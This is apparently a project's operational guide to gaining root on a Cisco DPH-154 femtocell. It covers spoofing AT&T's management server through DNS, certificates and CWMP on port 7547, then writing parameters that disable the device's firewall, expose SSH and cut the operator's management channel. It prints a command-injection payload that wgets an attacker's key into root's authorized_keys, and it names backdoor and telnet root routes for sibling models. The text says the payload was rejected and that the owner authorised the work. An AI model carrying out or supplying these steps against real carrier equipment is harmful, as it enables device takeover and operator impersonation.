# Bring-up: Cisco DPH-154 — the provider-emulation route, and the one bit that stops it

> ## 1️⃣ **BEFORE STEP ONE — CONFIRM WHICH UNIT YOU ARE HOLDING: [`MATRIX.md`](MATRIX.md)**
> **This guide is for the DPH-154: **no config banks at all** · **579** train · ⛔ JP: DO NOT OPEN IT**
> ⇒ ⛔ **If your unit is not that, STOP — the other models differ in ways that have cost this
> project days: bank numbering is REVERSED between the 151 and the nano3G, the 154 has no banks
> at all, and a 579 measurement is not a 563 fact.**
> ✅ **[`MATRIX.md`](MATRIX.md) is the identification table** — `## Identity`, `## Silicon and RF`,
> `## Capability`, `## Access and state`. **Read it first; it is 166 lines and it is the only
> document that tells you WHICH machine you have before you type anything.**
> 📌 **POINTER, NOT A COPY.** `[Wired in 2026-09-14: MATRIX.md existed and NO guide referenced it —
> the identification step was written and orphaned.]`


> ### 📋 EVIDENCE CLASS — and it is genuinely two different answers
> ✅ **ACCESS IS SOLVED.** There is a working route into a DPH-154 that needs **no memory-corruption
> exploit, no JTAG, no case opening and no serial console** — you stand up the management server the
> unit is already looking for, and let its own provisioning path do the work.
> ⛔ **THE RADIO IS SEPARATELY GATED, and on the unit measured here that gate is CLOSED.**
> `X_00000C_Tampered = 1` — **14 readbacks** — and `FAPService.Enabled` is refused with
> **FAULT 9003/9007.**
> ⇒ ⭐ **That is a per-unit condition, not a model-level wall.** A 154 with the bit clear should go
> all the way. **We do not have one, so the last phase is unproven and is labelled as such.**
>
> ⚠️ **An earlier revision of this page said "there is no route in."** That was written from an
> out-of-date reading of the corpus and **was wrong** — the access work had already been done. It is
> corrected here rather than quietly replaced, because *"we could never do X"* is exactly the kind of
> claim that survives past its own refutation.

---

## Why this route exists at all

The 154 is the hardened one. Every direct door is shut, and each of these was **measured**:

| door | state |
|---|---|
| the `wizard` **UDP** backdoor (works on older siblings) | ✅ **tested, did not work — and the image does not ship the handler** |
| anything listening | **13 ports probed, 13 closed** — and they are **ICMP-unreachable rejects**, the signature of a **firewall rule**, not of absent listeners |
| catching it phone home and answering as its server | **initiated nothing at all in 60 s of passive capture** |
| a public firmware dump to analyse | none exists, and the only software dump path **requires the access it would provide** |
| the software-download path, tried directly | ✅ **tested by JP, did not work** — see the fenced section at the foot of this page |

⇒ **Public exploits are 2012–2018 and target the 151/153. This is a 2019 build.**

> ### ✅ **RESOLVED 2026-09-16 — THE CONCLUSION HOLDS, AND IT NOW HAS EVIDENCE THAT SUPPORTS IT**
> **JP, who ran the attempts:** *"the wizard UDP backdoor → port 14677 closed, we tested this and we
> tested the software download and got neither to work — but yes, if you can't find the test then we
> can't mark it tested."*
> ⇒ ⭐⭐⭐ **And the reason it could not have worked is now measured STATICALLY, with a passing
> positive control and without probing any device:**
> ```
> "BackdoorPacketCmdLine"  (the fail0verflow protocol verb), via strings(1):
>    a Ralink rootfs that HAS the backdoor    2 hits   ✅ POSITIVE CONTROL
>    the DPH-154's own rootfs                 0 hits   ⬅ A REAL ABSENCE
> ```
> ⇒ ✅ **The 154 image does not contain the wizard backdoor's protocol handler.**
> ⛔ **BOUNDS: that rootfs is ONE filesystem from a 12-partition NAND dump, and a REIMPLEMENTATION
> under a different verb is not excluded.** **It shows the fail0verflow verb is absent — not that no
> UDP door exists.**
>
> ### ☠️ **AND TWO INSTRUMENTS FAILED ON THE WAY TO THAT LINE — BOTH SILENTLY**
> ```
> 1. the ORIGINAL wall:  TCP 22 23 80 443 7547 8080 8090 14677 -> all closed
>    ⛔ the wizard backdoor is UDP. A TCP scan of a UDP service reads "closed" either way —
>       AND ITS CONTROL PASSED (RST not filtered), because the scanner genuinely worked.
> 2. grepping for the PORT: "14677" -> 0 hits on EVERY tree, INCLUDING ones that have the listener.
>    ⛔ the port is a compiled integer (0x3955), not ASCII. That zero looks like corroboration
>       and carries nothing.
> 3. and grep -rl for the VERB -> 0 even on the control tree. strings(1) found it. Use strings.
> ```
> ⇒ ⭐⭐⭐ ***A CONTROL PROVES YOUR INSTRUMENT WORKS. IT SAYS NOTHING ABOUT WHETHER YOU AIMED IT AT
> THE RIGHT THING — OR WHETHER THE THING YOU SEEK SURVIVES COMPILATION AS TEXT.***
> ⭐ **The protocol VERB is a string and survives; the PORT is an integer and does not. Same target,
> two searches, only one of them can answer.**
> **The `wizard` backdoor is UDP.** `dph151-backdoor.py` sends `sock.sendto("BackdoorPacketCmdLine_Req …", (ip, 14677))`.
> ```
> what was actually run:   TCP 22 23 80 443 7547 8080 8090 14677  ->  all closed
>                          (RST not filtered, so the scanner demonstrably worked)
> ```
> ⇒ ⛔ **A TCP scan of a UDP service returns "closed" whether the UDP service is there or not.**
> ⭐⭐ **And the control PASSED — the scanner was working perfectly, on the wrong protocol.** ⇒
> ***A positive control proves your instrument works; it says nothing about whether you pointed it
> at the right thing.***
> ✅ **AND IT IS DOUBLY SHUT:** the wizard backdoor lands on the **Ralink**, and a 154 has none
> ([`Trap 73`](TRAPS.md#73-dph-151-vs-dph-154--three-exploits-share-one-name-the-cwmp-label-is-on-the-telnet-one-and-which-are-even-available-depends-on-the-model)).
> ⚠️ **The lesson kept: "tested and it failed", "measured closed" and "structurally impossible" are
> three different claims. This table asserted the second on evidence for none of them — and the
> first and third are both true, which is why nobody noticed.**
⭐ **So you do not attack the PERIMETER. You become the thing it is waiting for — and then you
attack ONE FIELD, from inside the conversation it opened to you voluntarily.**
⚠️ **Both halves matter.** Phase 1 alone gets you a management session and nothing more; Phase 2
alone has no channel to arrive on. **The provider emulation is not the exploit — it is what makes
the exploit reachable.**

---

## Phase 0 — Isolate, as always

The general caution in [`BRINGUP.md`](BRINGUP.md#before-you-plug-anything-in) applies. ⚠️ **On this
model it is doubly true**, because the whole route depends on the unit talking to *your* server
rather than reaching the internet and finding nothing.

---

## Phase 1 — Become AT&T, exactly

**This is the phase that takes the time, and it is the one JP names when he describes the access:**
*"we got it all configured like att."* ⭐ **Phase 2 is four lines. Phase 1 is a week.**

**Nothing here is an exploit.** You are answering a protocol the device initiates, with the identity
it expects. ⛔ **But "the identity it expects" is far more specific than it sounds, and every one of
the following was found the hard way.**

### 1️⃣ **The name and port come from the DEVICE, not from you — read `hw_description.dat`**

```
REDIRECTOR_URL = https://Femtocell.wireless.att.com:7547/acs
```
> ### ☠️☠️ **PORT 7547, NOT 443. WE LISTENED ON 443 ONLY, FOR A WEEK.**
> ⇒ ⭐⭐⭐ **While you listen on the wrong port, *"the device never dialled CWMP"* and *"the device
> dialled a CLOSED PORT"* are INDISTINGUISHABLE FROM EVERY MEASUREMENT YOU CAN TAKE.** **Both look
> like silence.** ⇒ **Bind the port the device's own config names, before concluding anything about
> its behaviour.**

### 2️⃣ **DNS must answer those names — and the device validates them**

```
femtocell.wireless.att.com  ->  your ACS address      (dnsmasq address= record)
```
✅ **Measured, with the exact check the device performs — name validation, no `-k`:**
```
curl --cacert <chain> https://femtocell.wireless.att.com:8443/logs
   subjectAltName: "femtocell.wireless.att.com" matches      HTTP 200   ✅
CONTROL, same command against the bare IP:                   000        🔴
```
⭐ **One variable — the hostname — and it flips the outcome.**

### 3️⃣ **The certificate CN must be the name it ACTUALLY dials, which is not the obvious one**

```
🔴 CN = femtocell.wireless.att.com        <- the name in REDIRECTOR_URL. IT NEVER ASKS FOR THIS.
✅ CN = dpewe-santa-clara.wireless.att.com <- DPE = Cisco Device Provisioning Engine, the CWMP tier
```
> ### ⚠️ **AND PUT BOTH CAPITALISATIONS IN THE SAN**
> `REDIRECTOR_URL` spells it **`Femtocell`** with a capital F. ⇒ **Carry `femtocell` AND `Femtocell`
> in the SAN so a client-side string compare cannot miss.** 📌 **A CN mismatch here cost a week on
> the CMHS leg, and it presents as silence, not as an error.**

### 4️⃣ **ACS and CMHS must live on DIFFERENT IP ADDRESSES**

⛔ **This is a hard requirement, not a preference.** The server selects its certificate context by
`getsockname()[0]` — **the address the device connected TO.** ⇒ **One IP cannot serve both roles,
because there is nothing left to discriminate them by.**
```
your ACS   ->  one address     (CWMP / TR-069, port 7547)
your CMHS  ->  a different one (the log/management tier)
```

### 5️⃣ **Give it a clock**

⚠️ **These units check certificate validity dates.** A device with no time source and a
2026-dated certificate rejects it — ⭐ **and the rejection is silent in exactly the same way
everything else here is.** 📌 **Y2K-dated leaf certificates are what worked; see the 2g corpus.**

---

### 🎯 **WHAT YOU HAVE AT THE END OF PHASE 1**

**A device that opens a CWMP session to you and accepts your instructions inside it.**
⛔ **That is NOT root, and it is NOT persistent** — it lasts exactly as long as you keep standing
where AT&T stood. ⇒ **Phase 2 is what converts a session into a shell.**

> ### ☠️☠️☠️ **AND BUDGET FOR THIS: EVERY UNIT THAT HAS EVER WORKED HERE INFORMED FOR *ONE DAY* AND THEN DIALLED FOREVER IN SILENCE.**
> `[measured across three units on one ACS. Counted from the ACS's own logs.]`
> ```
> unit B   09-05        392 dials / 92 Informs  (23.5%)
> unit B   09-06->09-17 477 dials / 0  Informs  (0%)      <- TWELVE DAYS, NOT ONE INFORM
> unit C   09-11        its only Informing day
> unit A   never Informed at all
> ```
> ⇒ ⭐⭐⭐ **THE DEVICE KEEPS DIALLING. It completes TLS, presents its client certificate, ACKs your
> Finished — and then FINs with ZERO APPLICATION BYTES.** **It is not unreachable, not misrouted,
> not refusing your certificate. It connects perfectly and says nothing.**
> ### ⛔ **THIS KILLS THE PER-DEVICE EXPLANATION, WHICH IS THE ONE EVERYONE REACHES FOR FIRST**
> **Three units, three different firmware trains, and the SAME one-day shape.** ⇒ **"that unit is
> faulty" / "that build is different" / "that one's certificate is wrong" cannot account for a
> pattern all three share.** ⚠️ **Plan Phase 3 around a management window that may close and not
> reopen — get what you need in the first day.**
> ### 📕 **RULED OUT, SO NOBODY SPENDS A NIGHT ON THEM**
> ```
> "serve it a different certificate"   ⛔ CLOSED, n=2 on the same intervention. A cert the unit
>                                         PROVABLY accepts on its other management leg was served
>                                         on the ACS leg; it FINed with zero bytes anyway, twice.
> "our rejected SetParameterValues     ⛔ CLOSED. The last Informing session of the unit that went
>  broke it"                              quiet contains NO ACS->CPE RPC AT ALL. Nothing was sent
>                                         to it to have broken it.
> "the clock is wrong, so the Y2K      ⛔ CLOSED. A unit's own report carries a CORRECT wall-clock
>  certificate reads as not-yet-valid"    time.
> ```
> ⭐⭐ **The shape that survives all three: a post-handshake, LOCAL, SILENT decision on the device,
> in single-digit milliseconds, with no network fetch.** **That is the revocation / trust-store
> shape — reached from the wire, independently of any code reading.**
> ⛔ **BOUND, AND IT IS LOAD-BEARING FOR EVERYTHING ABOVE:** the ACS log records *dialled → TLS-OK →
> peer closed* and **nothing between — no byte count, no request line.** ⇒ ***"it sends zero
> application bytes" is an INFERENCE FROM AN ABSENT LOG LINE.*** **Three states log identically:**
> **(a) it sent nothing · (b) it sent HTTP we could not parse · (c) headers, then closed pre-body.**
> ⇒ ✅ **A packet capture of that leg discriminates them and needs no code change. Until someone
> runs one, what is established is only *"we never logged anything it said."***

> ### ⚠️ **THE CWMP STORE AND THE NV ENVIRONMENT ARE DIFFERENT PLACES, AND CONFUSING THEM COSTS A DAY**
> ```
> our ACS writes  ->  the CWMP store only   (/var/ipaccess/cisco/dslg_cur_cfg.xml.gz)
>                     the TR-069 client has NO path to /var/ipaccess/nv_env.sh
> ```
> ⇒ **You cannot write the NV environment directly over CWMP.**
> ### ⭐⭐⭐ **NOT DIRECTLY. BUT ONE CWMP-WRITABLE FIELD IS COPIED INTO IT VERBATIM — AND THAT IS THE ROUTE.**
> **You do not need a path to `nv_env.sh`. You need a field the device itself copies there**, and
> `crlServerBaseUrl` is one. ⇒ **Phase 2 is that field.**

---

## Phase 2 — `X_00000C_LogUpload.Tuning`: the right FIELD, and an UNPROVEN second half

> ### 🔴🔴 **CORRECTED 2026-09-17 — `ENV_XKINIT` IS NOT A REAL KEY. THE DEVICE REJECTS IT, AND THAT WAS THE MOST QUOTABLE LINE ON THIS PAGE.**
> `[measured from the device's OWN response, 2026-09-11T15:55:21, in the ACS body log on the core.]`
> ```
> soap:Fault 9003 Invalid arguments
>   SetParameterValuesFault -> Device.X_00000C_LogUpload.Tuning
>   9007 "Invalid parameter value: The invalid value is 'ENV_XKINIT: $(grep -q dph151-jp ...'"
> ```
> ⇒ ⛔ **THE FIRMWARE VALIDATES KEY NAMES.** `ENV_XKINIT` was **invented by this project**, and the
> page's claim that *"the NAME is arbitrary — nothing consumes `ENV_XKINIT`"* is **exactly backwards**:
> nothing consumes it **because the device will not store it.**
> ### ✅ **THE SIX KEYS THE DEVICE ACTUALLY ACCEPTS** `[its own GetParameterValuesResponse, same session]`
> ```
> ENV_FIREWALL_DISABLED        TRUE      <- already TRUE ⇒ AN EARLIER Tuning SPV SUCCEEDED
> ENV_VERBOSE_CONSOLE_ENABLED  TRUE      <- also already set
> ENV_BASICOAM_DISABLED        TRUE
> ENV_SERIAL_CONSOLE_ENABLED   FALSE
> ENV_CRASH_REPORT_URL         (empty)   <- ★ the only URL-shaped field. The plausible escape sink.
> ENV_DIAG_FILE_LIST           /var/ipaccess/.tamperInfo .../nv_env.sh ...
> ```
> ⭐⭐ **THOSE TWO `TRUE`s ARE THE STRONGEST RESULT ON THIS PAGE AND THEY ARE NOT THE ONE IT CLAIMED.**
> **They are not defaults — something set them.** ⇒ **A `Tuning` SPV IS ACCEPTED AND IS STORED.**
> **That half is PROVEN. The half that carries the page — that a stored value reaches `nv_env.sh`
> and that `$( )` ever executes — IS NOT.**

> ### ⛔ **AND ON THE 579.11.127 TRAIN THE DOCUMENTED CHAIN DOES NOT RESOLVE AT ALL**
> `[lucid-fsvariant, read-only on a NAND dump of train 579.11.127, with controls stated below.]`
> ```
>                 setnv   nv_env   CONTROL '/opt'
> DslmSsp           0       0          8      <- CONTROL PASSES ⇒ THE ZERO IS A MEASUREMENT
> swdl_client       1       6          9      <- the sink's ACTUAL caller
> cmhs              0       0          0      <- ⚠️ CONTROL FAILS ⇒ these zeros are INADMISSIBLE
> sysctrlUpdateEnvVar:  0 files in the ENTIRE rootfs
> ```
> ⇒ 🔴 **`Tuning` → `DslmSsp` → `sysctrlUpdateEnvVar` → `setnv_env.sh` HAS NO `DslmSsp` HALF.**
> ### ✅ **AND IT IS WRONG ON *BOTH* TRAINS — SO IT WAS NEVER A VERSION REGRESSION**
> ~~*"It may be a 579.11.144 property — this page was written against a unit running .144."*~~
> **That hedge was written here on 2026-09-17 and refuted the same day.** `[0 hits for
> `setnv` / `nv_env` / `env.sh` / `sysctrlUpdateEnvVar` in **579.11.127 AND 579.11.144**, controls
> passing. `ENV_XKINIT` returns **zero hits image-wide.**]`
> ⇒ ⭐⭐⭐ **THE ROUTE WAS NEVER RIGHT ON ANY BUILD THIS PROJECT HAS TOUCHED.** **"Newer firmware
> removed it" was the comfortable reading and it is false** — there is no build in which it worked.
> ⭐ **A version hedge is the most attractive explanation available for a negative result, because it
> preserves the original claim as once-true.** ⇒ **Check the OTHER version before reaching for it.**
> ⛔ **BOUND, CARRIED VERBATIM FROM ITS AUTHOR:** *"a binary can call a script through a CONSTRUCTED
> string, so 'the literal is absent' is NOT 'it cannot call it.'"* **What makes the zero admissible
> is not the grep** — it is the complete command surface (35 strings, all printed), every path
> fragment against a `swdl_client` control reading non-zero on all of them, and all 7 path-shaped
> `%s` formats, **none of which builds under `/opt` or `/var`.**
> ### ⚠️ **DEVICE-ATTRIBUTION BOUND — THIS SITS UNDER THE NEGATIVE RESULT ABOVE, SO READ IT WITH IT**
> **The dump is a THIRD DEVICE** — its `hw_description.dat` serial matches neither unit discussed on
> this page. **Its author's phrasing, carried verbatim:** *"train 579.11.127 as shipped on a DONOR
> unit — applicability unverified."*
> ⇒ **Its results reach a running `579.11.127` unit by TRAIN EQUALITY, which is an INFERENCE** — not
> the byte-for-byte identity an earlier write-up claimed (*"THAT DUMP IS `.150`'s EXACT FILESYSTEM"*,
> **now struck by its own author**).
> 📌 **What is NOT in doubt: the running unit's own variant and train**, `282F` / `579.11.127`,
> **read from the DEVICE's own management report — never from the dump.**

> ### ✅ **AND A BRICK FEAR THAT A READER WILL OTHERWISE INFER FROM THIS PAGE — IT IS DEAD**
> **`setnv_env.sh:46` uses `$VARNAME` unquoted as a `sed` regex**, which looks like a malformed key
> could corrupt `nv_env.sh` and leave the unit unable to boot cleanly. ⇒ ⛔ **It cannot have
> happened here: NEITHER TRAIN HAS ANY ROUTE TO `setnv_env.sh` AT ALL.** **The rejected SPV never
> reached it, because nothing does.**
> ⭐ **Recorded because the inference is the natural one** — a rejected write, a device that later
> went quiet, and an unquoted regex sitting in the sink. **Three true facts that assemble into a
> false story.** ⚠️ **And the quieting has its own within-device control: the same unit was equally
> absent for six days earlier in the month, with no SPV anywhere near it, and came back on its own.**
> ⇒ ***Do not read "it stopped answering" as "we broke it."***

> ### ✅ **WHAT IS STILL TRUE, AND IT IS THE HALF WORTH KEEPING: THE SINK IS REAL**
> ```
> /etc/profile:66-70   NVENV=/var/ipaccess/nv_env.sh ; if [ -f $NVENV ]; then source $NVENV; fi
> setnv_env.sh:46      echo "export $1=\"$2\"" >> $NVENV      ⭐ NO ESCAPING. $2 GOES IN VERBATIM.
> ```
> ⇒ **A value carrying `$( )` that reaches that file IS executed as root at the next login.** ⛔ **The
> unproven link is everything UPSTREAM of it: what puts an attacker-chosen string into that file.**
> ⭐ **`swdl_client` is the one binary that reaches the sink** — so on this train the road to
> `nv_env` looks like the **software-download** path, not the CWMP parameter. ⚠️ **Which needs a
> management session to trigger, and CWMP is the dead channel.**

> ### 📕 **THE SUPERSEDED ROUTE-NAMING TRAIL, KEPT BECAUSE EACH WRONG VERSION IS ONE SOMEONE WILL REACH FOR**
> ```
> v1  "serve a firmware image; FS_VARIANT unhardens it"   NEVER DONE -- and it rewrites both U-Boot banks
> v2  "rewrite ManagementServer.URL to point at you"      wrong mechanism: a pointer, not an injection
> v3  "crlServerBaseUrl (2203)"                           RIGHT SINK, WRONG FIELD -- that is the 151's
>                                                          DMI attribute. The 154 has no DMI console.
> v4  "Tuning + ENV_XKINIT, over CWMP"                    RIGHT FIELD, REJECTED KEY -- fault 9003/9007
> ```
> ⭐⭐ **v1 has since come back as a MEASURED route and is no longer merely wrong** — see the
> dev-letter branch under the full-image section at the end of this page. **It is still the
> irreversible one, and still JP's decision rather than a lane's.**

**The device dials OUT to your ACS.** ⭐⭐⭐ **That single fact is why this route works on a 154 and
nothing else does:** the session is an **ESTABLISHED flow**, so the 154's wholesale inbound REJECT —
the thing that closes every other door — **is irrelevant to it.**

### 🔧 **THE CHAIN, EACH LINK NAMED**

```
device DIALS OUT (CWMP)                                              ✅ PROVEN
  ACS answers with SetParameterValues on Device.X_00000C_LogUpload.Tuning
     -> the device ACCEPTS and STORES the value                      ✅ PROVEN
        (two NV flags read TRUE that are not defaults)
     -> ??? ------------------------------------------------------- 🔴 NOT ESTABLISHED
        `DslmSsp` -> `sysctrlUpdateEnvVar` was the documented link.
        `sysctrlUpdateEnvVar` DOES NOT EXIST on the 579.11.127 train,
        and `DslmSsp` reaches neither `setnv_env` nor `nv_env`
        (control passing). `swdl_client` is the only binary that does.
     -> setnv_env.sh:46   echo "export $1=\"$2\"" >> nv_env.sh       ✅ SINK IS REAL, UNESCAPED
  => the next time ANY root consumer sources that file, a $( ) in it RUNS AS ROOT   ✅ MECHANISM REAL
```
⇒ ⭐⭐⭐ **THE MIDDLE ARROW IS THE WHOLE QUESTION, AND THIS PAGE USED TO DRAW IT SOLID.** Both ends
are measured; **nothing measured joins them.** ⛔ **A chain diagram is the single most quotable
artefact in a guide, and every link in it reads as equally established.** ⇒ **Mark the unproven
link INSIDE the diagram, never in a note beneath it.**

> ### 🎯 **AND `/etc/profile:69` SOURCES IT — SO A LOGIN IS ENOUGH**
> **No reboot. No service restart.** ⭐ **Compare the 151, where the equivalent needs TWO reboots** —
> the subshell cannot change the parent environment, so the flag must be written to the file and the
> box booted again. **Here, anything that opens a shell fires it.**

### 🎯 **THE WRITE THAT WORKS — AND IT IS THE THREE FLAGS, NOT AN INJECTION**

**Send only keys the firmware accepts.** These three are measured as accepted and stored:
```
Device.X_00000C_LogUpload.Tuning  =
  "ENV_FIREWALL_DISABLED:        TRUE;
   ENV_VERBOSE_CONSOLE_ENABLED:  TRUE;
   ENV_BASICOAM_DISABLED:        TRUE;"
```
```
ENV_FIREWALL_DISABLED  TRUE   so you can reach the port afterwards
ENV_VERBOSE_CONSOLE_…  TRUE   so dropbear binds 0.0.0.0:22 instead of loopback
ENV_BASICOAM_DISABLED  TRUE   ⬅ stops the unit's Basic-OAM channel phoning its real operator
```
⇒ ✅ **That is a real, useful configuration win and it needs no injection at all.** ⚠️ **It does
not by itself give you a shell** — it opens the path to one you obtain another way.

> ### 📕 **SUPERSEDED, KEPT VERBATIM — THE PAYLOAD AS THIS PAGE USED TO GIVE IT. IT IS REJECTED.**
> ```
> ~~Device.X_00000C_LogUpload.Tuning =~~
> ~~  "ENV_XKINIT: $(mkdir -p /var/ipaccess/root_home/.ssh && wget -q -O- http://<you>:8081/k~~
> ~~                 >>/var/ipaccess/root_home/.ssh/authorized_keys); ..."~~
> ~~⇒ "the NAME is arbitrary — nothing consumes ENV_XKINIT"~~
> ```
> 🔴 **`soap:Fault 9003 / 9007 Invalid parameter value`. The device names `ENV_XKINIT` in its own
> rejection.** ⇒ **Anyone who copies the struck block gets a fault and no shell.**
> ⭐⭐ **AND THE SENTENCE THAT MADE IT LOOK SAFE IS THE ONE THAT WAS WRONG.** *"The name is
> arbitrary"* was offered as reassurance — a throwaway clause, the kind nobody re-checks — and it
> was the **load-bearing false premise of the whole route.** ⇒ ***The claim most worth verifying is
> the one presented as too obvious to need it.***
> ⚠️ **A URL-shaped field survives as the remaining candidate sink: `ENV_CRASH_REPORT_URL` is
> accepted, is currently empty, and is the only one of the six that takes a URL.** ⛔ **Nobody has
> tested whether a `$( )` in it reaches `nv_env.sh` — and the chain above says the upstream half is
> missing on at least one train. UNMEASURED. Do not price it as a route.**

> ### ⛔⛔ **`Tuning` IS A WHOLE-STRING REPLACE, AND THE REAL WRITE HAD TO CARRY SIX PRE-EXISTING KEYS**
> **The device's live `Tuning` value already held keys. Sending only your own would have DELETED
> them.** ⇒ ✅ **`GetParameterValues` on `Tuning` FIRST, re-send every key verbatim, then add yours.**
> ⭐ **A DROPPED key is a visible omission; a STALE key looks like diligence — present, correctly
> spelled, and wrong.** 📌 **One re-arm here nearly rewrote `ENV_FIREWALL_DISABLED` back to `FALSE`
> from a readback taken before the firewall was ever opened — which would have closed tcp/22 on the
> operator's own access.**

### 📋 **THE FIELD'S NORMAL, DOCUMENTED USE — and this part is PROVEN**

**`Tuning` takes a `KEY: VALUE; KEY: VALUE` string and writes those into the NV environment.** That
is its *intended* function, and it is how the unit was configured:
```
ENV_FIREWALL_DISABLED: TRUE; ENV_VERBOSE_CONSOLE_ENABLED: TRUE;
ENV_SERIAL_CONSOLE_ENABLED: TRUE; ENV_CRASH_REPORT_URL: http://<you>:8082/crash;
ENV_DIAG_FILE_LIST: /var/ipaccess/.tamperInfo /var/ipaccess/nv_env.sh …
```
> ### ⚠️ **`Tuning` IS A WHOLE-STRING REPLACE, NOT A MERGE**
> ⛔ **Re-sending a stale copy of that string silently reverts every key you are not currently
> thinking about** — including the one holding your own access open. ⭐ **A DROPPED key is a visible
> omission; a STALE key looks like diligence — present, correctly spelled, and wrong.**

> ### ⛔⛔ **THE HONEST STATE OF THE ESCAPE — AND THE PAYLOAD IS IN THE TOOL, DATED AND ATTRIBUTED**
> ### 🔴 **READ THE PHASE 2 BANNER FIRST: THE KEY IN THE PAYLOAD BELOW IS ONE THE DEVICE REJECTS.**
> **The ✅ on *"the payload EXISTS"* means it exists IN THE TOOL — not that it worked.** ⭐ **A green
> check on a true statement, sitting one line above a payload, is read as a green check on the
> payload.**
> ### ⚠️ **AND A TENSION THIS PAGE MUST NOT RESOLVE BY PICKING A SIDE**
> ```
> JP, who ran it   "we were able to get into the 154 that way"      <- TESTIMONY
> the device       fault 9003/9007, naming ENV_XKINIT in its own    <- MEASUREMENT
>                  rejection; 0 of 663 readbacks contained the key
> ```
> ⇒ **Both are in this corpus and they do not agree.** ⛔ **Recorded, NOT adjudicated.** The
> possibilities include different moments, different units, a different key name on the successful
> attempt, or a route in by something other than this field. **Nobody has established which.**
> ⭐⭐ **This corpus's own rule applies and is the reason the page does not simply believe the
> operator: *testimony from the person holding the hardware has no evidence class here.*** ⚠️ **That
> cuts BOTH ways — it does not make the testimony false, it makes it unciteable as proof.** ✅ **What
> would settle it: the SPV body and the fault-or-success for the attempt JP is remembering.**
> ```
> ✅ the payload EXISTS, queued through this exact field, with its authorisation recorded in code:
>       Tuning <- "ENV_XKINIT: $(mkdir -p /var/ipaccess/root_home/.ssh && <key install>)"
>       log("*** DPH-154 ENV_XKINIT INJECTION QUEUED (JP authorised; his key, his device) ***")
> ✅ JP, who ran it:  "we were able to get into the 154 that way, but then the tamper timer went off"
> ⚠️ a corpus lane:   "THE PRIMITIVE IS DESIGNED, NOT DEMONSTRATED. Do not price it as proven."
>                     one logged attempt FAULTED 9003/9007; 0 of 663 readbacks contained ENV_XKINIT
> ```
> ⭐ **So three things are settled: the field is the right one, the payload was written, and it was
> authorised.** ⛔ **What is NOT settled is whether that particular queued write ever executed** —
> the readback evidence says that one did not. ⚠️ **Recorded, not adjudicated: the likeliest reading
> is different moments on different units, and nobody has established it.**
> ### 🔴 **CORRECTED 2026-09-17 — THE "BEYOND DOUBT" LINE BELOW WAS WRONG IN ITS THIRD CLAUSE.**
> ~~*"Beyond doubt either way: the `Tuning` write lands, the NV variables it sets take effect, and
> the field reaches `setnv_env.sh` unescaped."*~~
> ```
> "the Tuning write lands"                    ✅ STANDS — measured, an SPV was accepted and stored
> "the NV variables it sets take effect"      ✅ STANDS — two flags read TRUE that are not defaults
> "the field reaches setnv_env.sh unescaped"  🔴 NOT ESTABLISHED — this is the missing middle arrow
> ```
> ⇒ ☠️ **Two measured clauses and one unmeasured one, joined by "and" under the words "beyond
> doubt".** ⭐⭐ ***A conjunction inherits the confidence of its strongest member.*** The two true
> clauses were doing the persuasive work for the third, and the phrase "beyond doubt either way"
> made the whole sentence unre-checkable — **it reads as the place where the hedging STOPS.**
> ⚠️ **`setnv_env.sh` IS unescaped — that part is measured and kept above.** What is missing is any
> demonstrated path from the `Tuning` field TO `setnv_env.sh`.

> ### ✅ **THE PRECONDITION IS MEASURED, AND IT IS WHY THIS SUITS A 154 AND NOT A 151**
> ```
> a DPH-154   889 CWMP Informs, 60-second cadence, for hours   <- it TALKS to our ACS
> a DPH-151     0 CWMP bodies EVER, 0 of 355,325 log lines     <- it never speaks
> ```
> ⇒ ⭐ **JP's *"completely configuring the AP and getting it all set up"* IS the precondition.** The
> injection needs a live CWMP session, and a 154 gives you one.

> ### ☠️☠️ **THREE DIFFERENT MECHANISMS IN THIS CORPUS GET CONFLATED INTO "THE RCE". THEY ARE NOT THE SAME.**
> ```
> A  rroot.py          TELNET to the Ralink as guest -> rmm_client cs_cmd -> root on the RALINK
> B  the SPV injection CWMP SetParameterValues -> unescaped nv_env.sh write -> root on the PICO  ⬅ THIS
> C  persistent_ssh.sh POST-exploitation persistence; assumes you ALREADY have A or B
> ```
> ⇒ ⛔ **A is telnet, B is CWMP — opposite transports, different chips.** ⚠️ **And the "CWMP RCE"
> label in the upstream README sits on the TELNET one.** ⭐ **A DPH-154 has no Ralink at all, so A
> cannot apply to it under any circumstances** — see [`MATRIX.md`](MATRIX.md).

### 📌 **A NOTE ON THE DMI SIBLING, BECAUSE IT IS *NOT* THE 154 ROUTE**

**The same sink is reachable on a nano3G through DMI attribute `diagnosticTuning` (2320)**, and it
was played with here. ⛔ **It is NOT how this unit was entered and it does not apply to a 154 —
which has no DMI console at all.** 📌 **Documented where it belongs: [`ACCESS.md`](ACCESS.md)
Route 6.** ⭐ **On a 154 the ACS is the console.**

### 🚪 A second, WEAKER door on the same sink — and why it is weaker

```
crlServerBaseUrl (2203, ac=1 WRITABLE)  ->  export ENV_CRL_BASE_SERVER="<your value>"
```
⇒ **Also unescaped, so it also injects.** ⛔ **But it writes ONE FIXED VARIABLE: you inject into the
VALUE of a variable you did not choose.** ⭐ **`Tuning` takes `NAME: value; NAME: value`, so several
keys land in a single write** — `ENV_FIREWALL_DISABLED` and `ENV_VERBOSE_CONSOLE_ENABLED` together.
> ### 🔴 **CORRECTED 2026-09-17 — "YOU CHOOSE THE VARIABLE NAME" IS FALSE ON THE 154.**
> ~~*"you choose the variable NAME, which is why `ENV_XKINIT` … can all come from a single write"*~~
> **The firmware validates key names and rejects anything outside its six** (fault 9003/9007 — see
> the Phase 2 banner). ⇒ ⛔ **The advantage `Tuning` was said to have over `crlServerBaseUrl` — a
> free choice of variable name — DOES NOT EXIST.** **Both fields let you control a VALUE only.**
> ⭐⭐ **And that inverts the comparison this section was written to make:** `Tuning`'s edge over the
> 2203 door is now **breadth (several known keys at once), not arbitrary naming.** ⚠️ **`2203` is a
> nano3G DMI attribute and a 154 has no DMI console, so the comparison stays hypothetical here.**
> ### ☠️ **AND IF YOU GO LOOKING FOR `2203`, THE ATTRIBUTE MAPS IN CIRCULATION DISAGREE BY ONE ROW**
> ```
> the STALE map       2201 crlServerBaseUrl  ·  2203 crls
> the CORRECTED map   2201 certificates      ·  2203 crlServerBaseUrl   ac=1   ⬅ right
> ```
> ⇒ ⛔ **A NAME-SHIFTED map is worse than a wrong one: every id resolves, every name looks
> plausible, and you write a URL into a certificate-revocation-list field with nothing to tell you.**
> ✅ **Probe BY NUMBER and read back the name the device returns.** 📌 **Full 151 write-up including
> the two-reboot payload: the 2g corpus, `DEVICE-ACCESS.md` Steps 3–4.**

---

## Phase 3 — What you configure, and ALL of it goes through the ACS

